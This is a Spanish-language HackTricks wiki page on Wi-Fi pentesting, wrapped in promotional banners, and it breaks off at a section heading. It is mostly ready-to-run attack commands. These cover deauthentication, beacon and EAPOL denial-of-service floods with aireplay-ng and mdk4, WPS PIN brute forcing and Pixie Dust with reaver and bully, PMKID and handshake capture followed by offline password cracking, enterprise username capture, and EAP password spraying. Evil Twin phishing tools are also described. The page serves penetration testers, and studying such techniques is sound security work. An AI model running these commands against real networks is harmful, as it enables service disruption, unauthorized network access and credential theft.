# Pentesting Wifi

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

칔nete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores!

**Perspectivas de Hacking**\
Invol칰crate con contenido que profundiza en la emoci칩n y desaf칤os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente al d칤a con el mundo del hacking a trav칠s de noticias e informaci칩n en tiempo real

**칔ltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores que se lanzan y las actualizaciones cruciales de las plataformas

**칔nete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## Comandos b치sicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Herramientas

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon es una herramienta de prueba de penetraci칩n todo en uno para redes inal치mbricas. Ofrece una amplia gama de funciones para realizar pruebas de seguridad en redes WiFi, incluyendo ataques de deautenticaci칩n, ataques de fuerza bruta, ataques de diccionario, y m치s. Es una herramienta muy potente y popular en la comunidad de hacking 칠tico.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ejecutar airgeddon con docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Puede realizar ataques de Evil Twin, KARMA y Beacons Conocidos y luego utilizar una plantilla de phishing para lograr obtener la contrase침a real de la red o capturar credenciales de redes sociales.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Esta herramienta automatiza ataques **WPS/WEP/WPA-PSK**. Autom치ticamente:

* Configura la interfaz en modo monitor
* Escanea posibles redes - Y te permite seleccionar a la(s) v칤ctima(s)
* Si es WEP - Lanza ataques WEP
* Si es WPA-PSK
* Si es WPS: Ataque Pixie dust y ataque de fuerza bruta (ten cuidado, el ataque de fuerza bruta puede llevar mucho tiempo). Ten en cuenta que no intenta PIN nulo o PIN generados de base de datos.
* Intenta capturar el PMKID del AP para crackearlo
* Intenta desautenticar clientes del AP para capturar un handshake
* Si tiene PMKID o Handshake, intenta fuerza bruta usando las 5000 contrase침as principales.

## Resumen de Ataques

* **DoS**
* Paquetes de desautenticaci칩n/asociaci칩n -- Desconectar a todos (o a un ESSID/Cliente espec칤fico)
* APs falsos aleatorios -- Ocultar redes, posibles bloqueos de esc치neres
* Sobrecargar AP -- Intentar desactivar el AP (generalmente no muy 칰til)
* WIDS -- Jugar con el IDS
* TKIP, EAPOL -- Algunos ataques espec칤ficos para DoS en algunos APs
* **Cracking**
* Crackear **WEP** (varias herramientas y m칠todos)
* **WPA-PSK**
* PIN de **WPS** "Fuerza bruta"
* **WPA PMKID** fuerza bruta
* \[DoS +] Captura de **WPA handshake** + Cracking
* **WPA-MGT**
* Captura de **Nombre de usuario**
* **Fuerza bruta** de credenciales
* **Doble Malvado** (con o sin DoS)
* Doble Malvado **Abierto** \[+ DoS] -- 칔til para capturar credenciales de portal cautivo y/o realizar ataques LAN
* Doble Malvado **WPA-PSK** -- 칔til para ataques de red si conoces la contrase침a
* **WPA-MGT** -- 칔til para capturar credenciales de empresa
* **KARMA, MANA**, **MANA Ruidoso**, **Se침al conocida**
* **+ Abierto** -- 칔til para capturar credenciales de portal cautivo y/o realizar ataques LAN
* **+ WPA** -- 칔til para capturar handshakes de WPA

## DOS

### Paquetes de Desautenticaci칩n

La forma m치s com칰n en que se realiza este tipo de ataque es con paquetes de **desautenticaci칩n**. Estos son un tipo de marco "de gesti칩n" responsable de desconectar un dispositivo de un punto de acceso. Falsificar estos paquetes es clave para [hackear muchas redes Wi-Fi](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/), ya que puedes desconectar forzosamente a cualquier cliente de la red en cualquier momento. La facilidad con la que se puede hacer esto es algo aterrador y a menudo se hace como parte de la obtenci칩n de un handshake de WPA para crackear.

Adem치s de usar moment치neamente esta desconexi칩n para recolectar un handshake para crackear, tambi칠n puedes dejar que esas desautenticaciones sigan llegando, lo que tiene el efecto de bombardear al cliente con paquetes de desautenticaci칩n aparentemente del la red a la que est치n conectados. Debido a que estos marcos no est치n encriptados, muchos programas aprovechan los marcos de gesti칩n falsific치ndolos y envi치ndolos a uno o todos los dispositivos en una red.\
**Descripci칩n de** [**aqu칤**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Desautenticaci칩n usando Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 significa deautenticaci칩n
* 1 es el n칰mero de deautenticaciones a enviar (puedes enviar varias si lo deseas); 0 significa enviarlas continuamente
* \-a 00:14:6C:7E:40:80 es la direcci칩n MAC del punto de acceso
* \-c 00:0F:B5:34:30:30 es la direcci칩n MAC del cliente a desautenticar; si se omite esto, se env칤a una desautenticaci칩n de difusi칩n (no siempre funciona)
* ath0 es el nombre de la interfaz

### Paquetes de Desasociaci칩n

Los paquetes de desasociaci칩n son otro tipo de trama de gesti칩n que se utiliza para desconectar un nodo (cualquier dispositivo como un port치til o tel칠fono m칩vil) de un punto de acceso cercano. La diferencia entre las tramas de deautenticaci칩n y de desasociaci칩n radica principalmente en la forma en que se utilizan.

Un AP que busca desconectar un dispositivo no autorizado enviar칤a un paquete de deautenticaci칩n para informar al dispositivo que ha sido desconectado de la red, mientras que un paquete de desasociaci칩n se utiliza para desconectar cualquier nodo cuando el AP se est치 apagando, reiniciando o abandonando el 치rea.

**Descripci칩n de** [**aqu칤**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Este ataque puede ser realizado por mdk4 (modo "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **M치s ataques DOS por mdk4**

**Desde** [**aqu칤**](https://en.kali.tools/?p=864)**.**

**MODO DE ATAQUE b: Inundaci칩n de Beacons**

Env칤a tramas de beacons para mostrar APs falsos a los clientes. 춰Esto a veces puede hacer que los esc치neres de red e incluso los controladores se bloqueen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODO DE ATAQUE a: Denegaci칩n de Servicio de Autenticaci칩n**

Env칤a tramas de autenticaci칩n a todos los AP encontrados en el rango. Demasiados clientes pueden congelar o reiniciar varios AP.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODO DE ATAQUE p: Sondeo y Fuerza Bruta de SSID**

Sondea los AP y verifica la respuesta, 칰til para comprobar si el SSID ha sido descubierto correctamente y si el AP est치 dentro de tu rango de env칤o. Tambi칠n est치 disponible la **fuerza bruta de SSIDs ocultos** con o sin una lista de palabras.

**MODO DE ATAQUE m: Explotaci칩n de Contramedidas de Michael**

Env칤a paquetes aleatorios o reinyecta duplicados en otra cola de QoS para provocar las Contramedidas de Michael en los **APs TKIP**. El AP se apagar치 durante un minuto completo, convirti칠ndolo en un **DoS** efectivo.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODO DE ATAQUE e: Inyecci칩n de Paquetes EAPOL Start y Logoff**

Inunda un AP con tramas de inicio de **EAPOL** para mantenerlo ocupado con **sesiones falsas** y as칤 deshabilitarlo para manejar cualquier cliente leg칤timo. O desconecta a los clientes al **inyectar mensajes falsos** de Logoff de EAPOL.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODO DE ATAQUE s: Ataques para redes de malla IEEE 802.11s**

Varios ataques en la gesti칩n de enlaces y enrutamiento en redes de malla. 춰Inunde vecinos y rutas, cree agujeros negros y desv칤e el tr치fico!

**MODO DE ATAQUE w: Confusi칩n de WIDS**

Confunda/abuse los Sistemas de Detecci칩n y Prevenci칩n de Intrusiones cruzando clientes a m칰ltiples nodos WDS o puntos de acceso falsos.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODO DE ATAQUE f: Fuzzer de Paquetes**

Un fuzzer de paquetes simple con m칰ltiples fuentes de paquetes y un buen conjunto de modificadores. 춰Ten cuidado!

### **Airggedon**

_**Airgeddon**_ ofrece la mayor칤a de los ataques propuestos en los comentarios anteriores:

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS significa Configuraci칩n Protegida de Wi-Fi. Es un est치ndar de seguridad de red inal치mbrica que intenta hacer que las conexiones entre un enrutador y dispositivos inal치mbricos sean m치s r치pidas y f치ciles. **WPS solo funciona para redes inal치mbricas que utilizan una contrase침a** que est치 encriptada con los protocolos de seguridad **WPA** Personal o **WPA2** Personal. WPS no funciona en redes inal치mbricas que utilizan la seguridad WEP obsoleta, que puede ser f치cilmente crackeada por cualquier hacker con un conjunto b치sico de herramientas y habilidades. (De [aqu칤](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup))

WPS utiliza un PIN de 8 d칤gitos para permitir que un usuario se conecte a la red, pero primero se verifican los primeros 4 n칰meros y, si son correctos, luego se verifican los siguientes 4 n칰meros. Luego, es posible realizar un ataque de fuerza bruta en la primera mitad y luego en la segunda mitad (solo 11000 posibilidades).

### Fuerza Bruta de WPS

Existen 2 herramientas principales para realizar esta acci칩n: Reaver y Bully.

* **Reaver** ha sido dise침ado para ser un ataque robusto y pr치ctico contra WPS, y ha sido probado contra una amplia variedad de puntos de acceso e implementaciones de WPS.
* **Bully** es una **nueva implementaci칩n** del ataque de fuerza bruta de WPS, escrita en C. Tiene varias ventajas sobre el c칩digo original de reaver: menos dependencias, mejor rendimiento de memoria y CPU, manejo correcto de la endianness y un conjunto de opciones m치s robusto.

Este ataque aprovecha una **debilidad en el c칩digo PIN de WPS de ocho d칤gitos**; debido a este problema, el protocolo **revela informaci칩n sobre los primeros cuatro d칤gitos del PIN**, y el **칰ltimo** d칤gito funciona como un **checksum**, lo que facilita el ataque de fuerza bruta al AP de WPS.\
Ten en cuenta que algunos dispositivos incluyen **protecciones contra fuerza bruta**, que generalmente **bloquean las direcciones MAC** que intentan atacar repetidamente. En ese caso, la complejidad de este ataque aumenta, porque tendr칤as que **rotar las direcciones MAC** mientras pruebas los PIN.

Si se encuentra el c칩digo v치lido de WPS, tanto Bully como Reaver lo utilizar치n para descubrir el PSK de WPA/WPA2 utilizado para proteger la red, por lo que podr치s conectarte en cualquier momento que lo necesites.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Ataque de fuerza bruta inteligente**

En lugar de comenzar probando cada PIN posible, deber칤as verificar si hay **PINs descubiertos para el AP que est치s atacando** (dependiendo de la MAC del fabricante) y los **PINs generados por software**.

- La base de datos de PINs conocidos est치 hecha para Puntos de Acceso de ciertos fabricantes para los cuales se sabe que utilizan los mismos PINs de WPS. Esta base de datos contiene los tres primeros octetos de las direcciones MAC y una lista de PINs correspondientes que son muy probables para este fabricante.
- Hay varios algoritmos para generar PINs de WPS. Por ejemplo, ComputePIN y EasyBox utilizan la direcci칩n MAC del Punto de Acceso en sus c치lculos. Pero el algoritmo de Arcadyan tambi칠n requiere un ID de dispositivo.

### Ataque WPS Pixie Dust

Dominique Bongard descubri칩 que algunos APs tienen formas d칠biles de generar **n칰meros aleatorios** (conocidos como **E-S1** y **E-S2**) que se supone que son secretos. Si logramos descubrir cu치les son estos n칰meros aleatorios, podemos encontrar f치cilmente el PIN de un AP, ya que el AP debe proporcion치rnoslo en un hash para demostrar que tambi칠n conoce el PIN, y el cliente no se est치 conectando a un AP falso. Estos E-S1 y E-S2 son esencialmente las "claves para desbloquear la caja de seguridad" que contiene el PIN de WPS. M치s informaci칩n aqu칤: [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

B치sicamente, algunas implementaciones fallaron en el uso de claves aleatorias para cifrar las 2 partes del PIN (ya que se descompone en 2 partes durante la comunicaci칩n de autenticaci칩n y se env칤a al cliente), por lo que un ataque offline podr칤a usarse para realizar fuerza bruta en el PIN v치lido.
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Ataque de Pin Nulo

Algunas implementaciones realmente malas permiten la conexi칩n con Pin Nulo (muy extra침o tambi칠n). Reaver puede probar esto (Bully no puede).
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos los ataques propuestos de WPS se pueden realizar f치cilmente usando _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 y 6 te permiten probar **tu PIN personalizado** (si tienes alguno)
* 7 y 8 realizan el ataque **Pixie Dust**
* 13 te permite probar el **PIN NULL**
* 11 y 12 **recopilar치n los PIN relacionados con el AP seleccionado de las bases de datos disponibles** y **generar치n** posibles **PIN** usando: ComputePIN, EasyBox y opcionalmente Arcadyan (recomendado, 쯣or qu칠 no?)
* 9 y 10 probar치n **cada PIN posible**

## **WEP**

Tan vulnerable y obsoleto que no voy a hablar de 칠l. Solo s칠 que _**airgeddon**_ tiene una opci칩n WEP llamada "All-in-One" para atacar este tipo de protecci칩n. M치s herramientas ofrecen opciones similares.

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

칔nete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de recompensas por errores.

**Perspectivas de Hacking**\
Invol칰crate con contenido que profundiza en la emoci칩n y los desaf칤os del hacking

**Noticias de Hacking en Tiempo Real**\
Mantente actualizado con el mundo del hacking a trav칠s de noticias e informaci칩n en tiempo real

**칔ltimos Anuncios**\
Mantente informado sobre los nuevos programas de recompensas por errores que se lanzan y las actualizaciones cruciales de la plataforma

**칔nete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!

## WPA/WPA2 PSK

### PMKID

En 2018, los autores de hashcat [revelaron](https://hashcat.net/forum/thread-7717.html) un nuevo tipo de ataque que no solo se basa **en un solo paquete**, sino que no requiere que ning칰n cliente est칠 conectado a nuestro AP objetivo, solo la comunicaci칩n entre el atacante y el AP.

Resulta que **muchos** routers modernos a침aden un **campo opcional** al final del **primer marco EAPOL** enviado por el propio AP cuando alguien se est치 asociando, el llamado `Red de Seguridad Robusta`, que incluye algo llamado `PMKID`

Como se explica en el post original, el **PMKID** se deriva utilizando datos que nos son conocidos:
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
**Dado que la cadena "Nombre de PMK" es constante, conocemos tanto el BSSID del AP como el de la estaci칩n y el `PMK` es el mismo obtenido de un apret칩n de manos completo de 4 v칤as**, 춰esto es todo lo que hashcat necesita para crackear la PSK y recuperar la contrase침a!\
Descripci칩n obtenida de [aqu칤](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/).

Para **recopilar** esta informaci칩n y **realizar fuerza bruta** localmente la contrase침a, puedes hacer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Los **PMKIDs capturados** se mostrar치n en la **consola** y tambi칠n se **guardar치n** dentro de \_ **/tmp/attack.pcap**\_\
Ahora, convierte la captura al formato de **hashcat/john** y desc칤frala:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Por favor, ten en cuenta que el formato correcto de un hash contiene **4 partes**, como: _4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6e65436f6e6e6563743034383131343838_\
\_\_Si el tuyo **solo** contiene **3 partes**, entonces, es **inv치lido** (la captura PMKID no fue v치lida).

Ten en cuenta que `hcxdumptool` **tambi칠n captura handshakes** (algo as칤 aparecer치: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Puedes **transformar** los **handshakes** al formato de **hashcat**/**john** usando `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_He notado que algunas capturas de apretones de manos realizadas con esta herramienta no se pudieron descifrar incluso sabiendo la contrase침a correcta. Recomiendo capturar apretones de manos tambi칠n de forma tradicional si es posible, o capturar varios de ellos usando esta herramienta._

### Captura de apret칩n de manos

Una forma de atacar redes **WPA/WPA2** es capturar un **apret칩n de manos** e intentar **descifrar** la contrase침a utilizada **sin conexi칩n**. Para hacerlo, necesitas encontrar el **BSSID** y el **canal** de la red de la **v칤ctima**, y un **cliente** que est칠 conectado a la red.\
Una vez que tengas esa informaci칩n, debes comenzar a **escuchar** toda la comunicaci칩n de ese **BSSID** en ese **canal**, porque con suerte el apret칩n de manos se enviar치 all칤:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Ahora necesitas **desautenticar** al **cliente** durante unos segundos para que se autentique autom치ticamente de nuevo en el AP (por favor, lee la parte de DoS para encontrar varias formas de desautenticar a un cliente):
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_Nota que una vez que el cliente fue desautenticado, podr칤a intentar conectarse a un AP diferente o, en otros casos, a una red diferente._

Una vez que en `airodump-ng` aparezca informaci칩n de un handshake, significa que el handshake fue capturado y puedes dejar de escuchar:

![](<../../.gitbook/assets/image (172) (1).png>)

Una vez que el handshake es capturado, puedes **descifrarlo** con `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar si hay handshake en el archivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si esta herramienta encuentra un apret칩n de manos incompleto de un ESSID antes que el completo, no detectar치 el v치lido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Es importante hablar sobre los **diferentes m칠todos de autenticaci칩n** que podr칤an ser utilizados por un Wifi empresarial. Para este tipo de Wifis, probablemente encontrar치s en `airodump-ng` algo como esto:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
**EAP** (Extensible Authentication Protocol) es el **esqueleto** de la **comunicaci칩n de autenticaci칩n**, sobre esto, un **algoritmo de autenticaci칩n** es utilizado por el servidor para autenticar al **cliente** (**suplicante**) y en algunos casos por el cliente para autenticar al servidor.\
Principales algoritmos de autenticaci칩n utilizados en este caso:

* **EAP-GTC:** Es un m칠todo EAP para soportar el uso de tokens de hardware y contrase침as de un solo uso con EAP-PEAP. Su implementaci칩n es similar a MSCHAPv2, pero no utiliza un desaf칤o entre pares. En su lugar, las contrase침as se env칤an al punto de acceso en **texto plano** (muy interesante para ataques de degradaci칩n).
* **EAP-MD-5 (Message Digest)**: El cliente env칤a el hash MD5 de la contrase침a. **No recomendado**: Vulnerable a ataques de diccionario, sin autenticaci칩n del servidor y sin forma de generar claves de privacidad equivalentes al cableado (WEP) por sesi칩n.
* **EAP-TLS (Transport Layer Security)**: Se basa en **certificados del lado del cliente y del servidor** para realizar la autenticaci칩n y puede utilizarse para generar din치micamente claves WEP basadas en usuario y sesi칩n para asegurar comunicaciones posteriores.
* **EAP-TTLS (Tunneled Transport Layer Security)**: **Autenticaci칩n mutua** del cliente y la red a trav칠s de un canal encriptado (o t칰nel), as칤 como un medio para derivar claves WEP din치micas, por usuario y por sesi칩n. A diferencia de EAP-TLS, **EAP-TTLS solo requiere certificados del lado del servidor (el cliente usar치 credenciales)**.
* **PEAP (Protected Extensible Authentication Protocol)**: PEAP es como el protocolo **EAP** pero creando un **t칰nel TLS** para proteger la comunicaci칩n. Luego, se pueden utilizar protocolos de autenticaci칩n d칠biles sobre EAP ya que estar치n protegidos por el t칰nel.
* **PEAP-MSCHAPv2**: Tambi칠n conocido como solo **PEAP** porque es ampliamente adoptado. Se trata del desaf칤o/respuesta vulnerable llamado MSCHAPv2 sobre PEAP (est치 protegido por el t칰nel TLS).
* **PEAP-EAP-TLS o simplemente PEAP-TLS**: Es muy similar a **EAP-TLS** pero se crea un t칰nel TLS antes de intercambiar los certificados.

Puedes encontrar m치s informaci칩n sobre estos m칠todos de autenticaci칩n [aqu칤](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol)y [aqu칤](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de Nombre de Usuario

Al leer [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que si est치s usando **EAP** los **mensajes de "Identidad"** deben ser **compatibles**, y el **nombre de usuario** se enviar치 en **texto claro** en los **mensajes de "Respuesta de Identidad"**.

Incluso al usar uno de los m칠todos de autenticaci칩n m치s seguros: **PEAP-EAP-TLS**, es posible **capturar el nombre de usuario enviado en el protocolo EAP**. Para hacerlo, **captura una comunicaci칩n de autenticaci칩n** (inicia `airodump-ng` en un canal y `wireshark` en la misma interfaz) y filtra los paquetes por `eapol`.\
Dentro del paquete "**Respuesta, Identidad**", aparecer치 el **nombre de usuario** del cliente.

![](<../../.gitbook/assets/image (150).png>)

### Identidades An칩nimas

El ocultamiento de identidad es compatible tanto con EAP-PEAP como con EAP-TTLS. En el contexto de una red WiFi, una solicitud de EAP-Identidad es t칤picamente iniciada por el punto de acceso (AP) durante el proceso de asociaci칩n. Para garantizar la protecci칩n del anonimato del usuario, la respuesta del cliente de EAP en el dispositivo del usuario contiene solo la informaci칩n esencial requerida para que el servidor RADIUS inicial procese la solicitud. Este concepto se ilustra a trav칠s de los siguientes escenarios:

* EAP-Identidad = an칩nimo

- En este escenario, todos los usuarios emplean el seud칩nimo "an칩nimo" como su identificador de usuario. El servidor RADIUS inicial funciona como un servidor EAP-PEAP o EAP-TTLS, responsable de gestionar el lado del servidor del protocolo PEAP o TTLS. El m칠todo de autenticaci칩n interno (protegido) es manejado localmente o delegado a un servidor RADIUS remoto (de origen).

* EAP-Identidad = an칩nimo@reino_x

- En esta situaci칩n, los usuarios de diferentes reinos ocultan sus identidades mientras indican sus respectivos reinos. Esto permite que el servidor RADIUS inicial reenv칤e las solicitudes de EAP-PEAP o EAP-TTLS a servidores RADIUS en sus reinos de origen, que act칰an como el servidor PEAP o TTLS. El servidor RADIUS inicial opera 칰nicamente como un nodo de retransmisi칩n RADIUS.

- Alternativamente, el servidor RADIUS inicial puede funcionar como el servidor EAP-PEAP o EAP-TTLS y manejar el m칠todo de autenticaci칩n protegido o reenviarlo a otro servidor. Esta opci칩n facilita la configuraci칩n de pol칤ticas distintas para varios reinos.

En EAP-PEAP, una vez que se establece el t칰nel TLS entre el servidor PEAP y el cliente PEAP, el servidor PEAP inicia una solicitud de EAP-Identidad y la transmite a trav칠s del t칰nel TLS. El cliente responde a esta segunda solicitud de EAP-Identidad enviando una respuesta de EAP-Identidad que contiene la verdadera identidad del usuario a trav칠s del t칰nel encriptado. Este enfoque evita efectivamente la revelaci칩n de la identidad real del usuario a cualquier persona que est칠 interceptando el tr치fico 802.11.

EAP-TTLS sigue un procedimiento ligeramente diferente. Con EAP-TTLS, el cliente suele autenticarse usando PAP o CHAP, asegurado por el t칰nel TLS. En este caso, el cliente incluye un atributo de Nombre de Usuario y ya sea una Contrase침a o un atributo de Contrase침a CHAP en el mensaje TLS inicial enviado despu칠s del establecimiento del t칰nel.

Independientemente del protocolo elegido, el servidor PEAP/TTLS obtiene conocimiento de la verdadera identidad del usuario despu칠s de que se haya establecido el t칰nel TLS. La verdadera identidad puede representarse como usuario@reino o simplemente usuario. Si el servidor PEAP/TTLS tambi칠n es responsable de autenticar al usuario, ahora posee la identidad del usuario y procede con el m칠todo de autenticaci칩n protegido por el t칰nel TLS. Alternativamente, el servidor PEAP/TTLS puede reenviar una nueva solicitud RADIUS al servidor RADIUS de origen del usuario. Esta nueva solicitud RADIUS omite la capa de protocolo PEAP o TTLS. En casos donde el m칠todo de autenticaci칩n protegido es EAP, los mensajes EAP internos se transmiten al servidor RADIUS de origen sin el envoltorio EAP-PEAP o EAP-TTLS. El atributo de Nombre de Usuario del mensaje RADIUS saliente contiene la verdadera identidad del usuario, reemplazando el Nombre de Usuario an칩nimo del mensaje RADIUS entrante. Cuando el m칠todo de autenticaci칩n protegido es PAP o CHAP (soportado solo por TTLS), el Nombre de Usuario y otros atributos de autenticaci칩n extra칤dos de la carga 칰til TLS se sustituyen en el mensaje RADIUS saliente, desplazando el Nombre de Usuario an칩nimo y los atributos de Mensaje EAP TTLS encontrados en la solicitud RADIUS entrante.

Para m치s informaci칩n, consulta [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)


### EAP-Bruteforce (password spray)

Si se espera que el cliente use un **nombre de usuario y contrase침a** (nota que **EAP-TLS no ser치 v치lido** en este caso), entonces podr칤as intentar obtener una **lista** de **nombres de usuario** (ver la siguiente parte) y **contrase침as** e intentar **bruteforce** el acceso usando [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Tambi칠n puedes realizar este ataque utilizando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Ataques a clientes: Teor칤a

### Selecci칩n de red y roaming

